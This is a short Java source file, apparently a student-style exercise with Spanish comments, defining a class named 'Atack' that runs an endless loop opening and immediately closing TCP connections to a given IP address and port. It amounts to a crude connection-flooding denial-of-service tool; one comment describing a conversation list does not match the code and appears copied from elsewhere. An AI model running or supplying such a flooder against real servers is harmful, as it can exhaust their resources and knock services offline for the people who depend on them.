import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;


public class Atack implements Runnable {
	String ip;
	int puerto;
	String strArbitrario;
// En el constructor recibe y guarda los parámetros que sean necesarios.
   // En este caso una lista con toda la conversación y el socket que debe
   // atender.

  public Atack(String ip, int puerto)
   {
      this.ip = ip;
      this.puerto = puerto;
   }
  
  public Atack(String ip, int puerto, String strArbitrario)
  {
	  this.ip = ip;
      this.puerto = puerto;
      this.strArbitrario = strArbitrario;
  }

   public void run ()
   {		
	   Socket sock = null;
	   
	   while(true)
    	 
    	  try 
    	  {
			sock = new Socket(ip, puerto);
			if(strArbitrario == null)
			System.out.println("Conectado");
			
			sock.close();
    	  } 
    	  catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	 
   }
}

